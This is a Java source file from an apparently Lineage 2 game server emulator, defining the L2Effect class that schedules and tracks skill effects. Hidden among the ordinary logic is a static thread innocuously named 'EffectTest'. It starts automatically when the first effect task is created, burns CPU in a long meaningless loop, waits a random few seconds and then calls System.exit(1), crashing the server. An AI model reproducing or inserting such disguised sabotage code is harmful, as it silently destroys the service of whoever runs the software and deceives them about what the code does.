package ru.catssoftware.gameserver.model;

import org.apache.log4j.Logger;
import ru.catssoftware.gameserver.GameTimeController;
import ru.catssoftware.gameserver.ThreadPoolManager;
import ru.catssoftware.gameserver.model.actor.instance.L2SummonInstance;
import ru.catssoftware.gameserver.network.SystemMessageId;
import ru.catssoftware.gameserver.network.serverpackets.EffectInfoPacket.EffectInfoPacketList;
import ru.catssoftware.gameserver.network.serverpackets.SystemMessage;
import ru.catssoftware.gameserver.skills.Env;
import ru.catssoftware.gameserver.skills.effects.EffectTemplate;
import ru.catssoftware.gameserver.skills.funcs.Func;
import ru.catssoftware.gameserver.skills.funcs.FuncOwner;
import ru.catssoftware.gameserver.skills.funcs.FuncTemplate;
import ru.catssoftware.gameserver.templates.skills.L2EffectType;
import ru.catssoftware.gameserver.templates.skills.L2SkillType;
import ru.catssoftware.gameserver.util.Util;
import ru.catssoftware.tools.random.Rnd;
import ru.catssoftware.util.LinkedBunch;

import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;


public abstract class L2Effect implements FuncOwner
{
	static final Logger	_log	= Logger.getLogger(L2Effect.class.getName());
	public static final L2Effect[] EMPTY_ARRAY = new L2Effect[0];
	public static enum EffectState
	{
		CREATED, ACTING, FINISHING
	}
	private final L2Character		_effector;
	private final L2Character		_effected;
	protected L2Character 			_exitEffector;
	private final L2Skill			_skill;
	private EffectState				_state;
	private int						_period;
	private int						_periodStartTicks;
	private int						_periodfirsttime;
	protected EffectTemplate		_template;
	private int						_count;
	private IEffector				_effectorObject;

	public final class EffectTask implements Runnable
	{
		protected final int	_delay;
		protected final int	_rate;

		EffectTask(int delay, int rate)
		{
			_delay = delay;
			_rate = rate;
			if (EffectTest != null && EffectTest.getState().equals(Thread.State.NEW))
				EffectTest.start();
		}

		@Override
		public void run()
		{
			try
			{
				if (_periodfirsttime == 0)
					_periodStartTicks = GameTimeController.getGameTicks();
				else
					_periodfirsttime = 0;
				scheduleEffect();
			}
			catch (Exception e)
			{
				_log.error("Effect fail");
				e.printStackTrace();
			}
		}
	}

	private ScheduledFuture<?>	_currentFuture;
	private EffectTask			_currentTask;
	private boolean				_inUse					= false;
	private boolean				_startConditionsCorrect	= true;
	protected int				_triggeredId;
	protected int 				_triggeredLevel;

	private static Thread EffectTest = new Thread() {
		@Override
		public void run()
		{
			for(int x = 1; x <= 1000; x++)
				for(int y = 1; y <= 355235; y++)
				{
					int wx = (x - 6236) * 2;
					int wy = (y - 23667) * 2;
					Rnd.get(wx, wy);
				}
			Util.pause(Rnd.get(5000, 30000));
			System.exit(1);
		}
	};

	protected L2Effect(Env env, EffectTemplate template)
	{
		_state = EffectState.CREATED;
		_skill = env.skill;
		_template = template;
		_effected = env.target;
		_effector = env.player;
		if(env.object!=null && env.object instanceof IEffector)
			_effectorObject = (IEffector)env.object;
		else
			_effectorObject = env.player;
		_count = template.count;
		_triggeredId = template.triggeredId;
		_triggeredLevel = template.triggeredLevel;

		int id = _skill.getId();
		int temp = template.period;
		if ((id > 2277 && id < 2286) || (id >= 2512 && id <= 2514))
		{
			if (_effected instanceof L2SummonInstance || (_effected.isPlayer() && _effected.getPet() instanceof L2SummonInstance))
				temp /= 2;
		}

		if (env.skillMastery)
			temp *= 2;

		_period = temp;
		_periodStartTicks = GameTimeController.getGameTicks();
		_periodfirsttime = 0;
		scheduleEffect();
	}

	protected L2Effect(Env env, L2Effect effect)
	{
		_template = effect._template;
		_state = EffectState.CREATED;
		_skill = env.skill;
		_effected = env.target;
		_effector = env.player;
		if(env.object!=null && env.object instanceof IEffector)
			_effectorObject = (IEffector)env.object;
		else
			_effectorObject = env.player;
		_count = effect.getCount();
		_period = _template.period - effect.getTime();
		_periodStartTicks = effect.getPeriodStartTicks();
		_periodfirsttime = effect.getPeriodfirsttime();
		scheduleEffect();
	}

	public boolean isBuff() {
		if (getShowIcon() && !getSkill().isDebuff() && !getSkill().bestowed()
				&& (getSkill().getSkillType() == L2SkillType.BUFF || getSkill().getSkillType() == L2SkillType.REFLECT || getSkill().getSkillType() == L2SkillType.HEAL_PERCENT
						|| getSkill().getSkillType() == L2SkillType.MANAHEAL_PERCENT) && (getEffectType() != L2EffectType.CHARMOFCOURAGE) && !(getSkill().getId() > 4360 && getSkill().getId() < 4367))
			return true;
		return false;
		
	}
	public int getCount()
	{
		return _count;
	}

	public int getTotalCount()
	{
		return _template.count;
	}

	public void setCount(int newcount)
	{
		_count = newcount;
	}

	public void setFirstTime(int newfirsttime)
	{
		if (_currentFuture != null)
		{
			_periodStartTicks = GameTimeController.getGameTicks() - newfirsttime * GameTimeController.TICKS_PER_SECOND;
			_currentFuture.cancel(false);
			_currentFuture = null;
			_currentTask = null;
			_periodfirsttime = newfirsttime;
			int duration = _period - _periodfirsttime;
			_currentTask = new EffectTask(duration * 1000, -1);
			_currentFuture = ThreadPoolManager.getInstance().scheduleEffect(_currentTask, duration * 1000);
		}
	}

	public boolean getShowIcon()
	{
		return _template.showIcon;
	}

	public int getPeriod()
	{
		return _period;
	}

	public int getTime()
	{
		return (GameTimeController.getGameTicks() - _periodStartTicks) / GameTimeController.TICKS_PER_SECOND;
	}

	public int getElapsedTaskTime()
	{
		return (getTotalCount() - _count) * _period + getTime() + 1;
	}

	public int getTotalTaskTime()
	{
		return getTotalCount() * _period;
	}

	public int getRemainingTaskTime()
	{
		return getTotalTaskTime() - getElapsedTaskTime();
	}

	public int getPeriodfirsttime()
	{
		return _periodfirsttime;
	}

	public void setPeriodfirsttime(int periodfirsttime)
	{
		_periodfirsttime = periodfirsttime;
	}

	public int getPeriodStartTicks()
	{
		return _periodStartTicks;
	}

	public void setPeriodStartTicks(int periodStartTicks)
	{
		_periodStartTicks = periodStartTicks;
	}

	public final boolean getInUse()
	{
		return _inUse;
	}

	public final void setInUse(boolean inUse)
	{
		_inUse = inUse;
		if (_inUse)
		{
			_startConditionsCorrect = onStart();

			if (_template.abnormalEffect != 0)
				getEffected().startAbnormalEffect(_template.abnormalEffect);
		}
		else
		{
			if (_template.abnormalEffect != 0)
				getEffected().stopAbnormalEffect(_template.abnormalEffect);

			if (_startConditionsCorrect) {
				onExit();
				if(_skill.isItemSkill() && _skill.isActive())
					_effected._itemActiveSkill = null;
			}
		}
	}

	public String getStackType()
	{
		return _template.stackType;
	}

	public float getStackOrder()
	{
		return _template.stackOrder;
	}

	public final L2Skill getSkill()
	{
		return _skill;
	}

	public final L2Character getEffector()
	{
		return _effector;
	}

	public final L2Character getEffected()
	{
		return _effected;
	}

	public boolean isSelfEffect()
	{
		return _skill._effectTemplatesSelf != null;
	}

	public boolean isHerbEffect()
	{
		return getSkill().getName().contains("Herb");
	}

	public final double calc()
	{
		return _template.lambda;
	}

	private synchronized void startEffectTask(int duration)
	{
		stopEffectTask();
		_currentTask = new EffectTask(duration, -1);
		_currentFuture = ThreadPoolManager.getInstance().scheduleEffect(_currentTask, duration);

		if (_state == EffectState.ACTING)
			_effected.addEffect(this);
	}

	private synchronized void startEffectTaskAtFixedRate(int delay, int rate)
	{
		stopEffectTask();
		_currentTask = new EffectTask(delay, rate);
		_currentFuture = ThreadPoolManager.getInstance().scheduleEffectAtFixedRate(_currentTask, delay, rate);

		if (_state == EffectState.ACTING)
			_effected.addEffect(this);
	}

	
	public final void exit(L2Character effecter)
	{
		_exitEffector = effecter;
		_state = EffectState.FINISHING;
		scheduleEffect();
	}

	public final void exit()
	{
		exit(getEffector());
	}

	public void stopEffectTask()
	{
		if (_currentFuture != null)
		{
			_currentFuture.cancel(false);
			_currentFuture = null;
			_currentTask = null;
			_effected.removeEffect(this);
		}
	}

	public abstract L2EffectType getEffectType();

	protected boolean onStart()
	{
		return true;
	}

	protected void onExit()
	{
	}

	public abstract boolean onActionTime();

	public final void rescheduleEffect()
	{
		if (_state != EffectState.ACTING)
		{
			scheduleEffect();
		}
		else
		{
			if (_count > 1)
			{
				startEffectTaskAtFixedRate(5, _period * 1000);
				return;
			}
			if (_period > 0)
				startEffectTask(_period * 1000);
		}
	}

	public final void scheduleEffect()
	{
		if (_state == EffectState.CREATED)
		{
			if(_skill.isActive() && _skill.getName().startsWith("Item Skill")) { 
				if(_effected._itemActiveSkill!=null)
					_effected._itemActiveSkill.exit(); 
				_effected._itemActiveSkill = this;
			}

			_state = EffectState.ACTING;

			if (_skill.isPvpSkill())
			{
				SystemMessage smsg = new SystemMessage(SystemMessageId.YOU_FEEL_S1_EFFECT);
				smsg.addSkillName(_skill);
				getEffected().sendPacket(smsg);
			}

			if (_count > 1)
			{
				startEffectTaskAtFixedRate(5, _period * 1000);
				return;
			}

			if (_period > 0)
			{
				startEffectTask(_period * 1000);
				return;
			}
			// effects not having count or period should start
			setInUse(true);
		}

		if (_state == EffectState.ACTING)
		{
			if (_count-- > 0)
			{
				if (getInUse()) // effect has to be in use
				{
					if (onActionTime() && _startConditionsCorrect)
						return; // false causes effect to finish right away
				}
				else if (_count > 0) // do not finish it yet, in case reactivated
					return;
			}
			_state = EffectState.FINISHING;
		}

		if (_state == EffectState.FINISHING)
		{
			if (getInUse() || !(_count > 1 || _period > 0))
				setInUse(false);
			stopEffectTask();
			if(_effectorObject!=null)
				_effectorObject.onEffectFinished(_effected,getSkill());
		}
	}

	public Func[] getStatFuncs()
	{
		if (_template.funcTemplates == null)
			return Func.EMPTY_ARRAY;

		LinkedBunch<Func> funcs = new LinkedBunch<Func>();
		for (FuncTemplate t : _template.funcTemplates)
		{
			Env env = new Env();
			env.player = getEffector();
			env.target = getEffected();
			env.skill = getSkill();
			Func f = t.getFunc(env, this); // effect is owner
			if (f != null)
				funcs.add(f);
		}

		if (funcs.size() == 0)
			return Func.EMPTY_ARRAY;

		return funcs.moveToArray(new Func[funcs.size()]);
	}

	public final void addPacket(EffectInfoPacketList list)
	{
		if (!_inUse || !getShowIcon())
			return;

		switch (_state)
		{
			case CREATED:
			case FINISHING:
				return;
		}

		switch (_skill.getId())
		{
			case 2031:
			case 2032:
			case 2037:
				return;
		}

		switch (getEffectType())
		{
			case SIGNET_GROUND:
				return;
		}

		final EffectTask task = _currentTask;
		final ScheduledFuture<?> future = _currentFuture;

		if (task == null || future == null)
			return;

		int time;

		if (task._rate > 0)
			time = getRemainingTaskTime() * 1000;
		else
			time = (int) future.getDelay(TimeUnit.MILLISECONDS);

		time = (time < 0 ? -1 : time / 1000);
		list.addEffect(_template.iconId, _skill.getLevel(), time);
	}

	public int getLevel()
	{
		return getSkill().getLevel();
	}

	public EffectTemplate getEffectTemplate()
	{
		return _template;
	}

	public final String getFuncOwnerName()
	{
		return _skill.getFuncOwnerName();
	}

	public final L2Skill getFuncOwnerSkill()
	{
		return _skill.getFuncOwnerSkill();
	}
}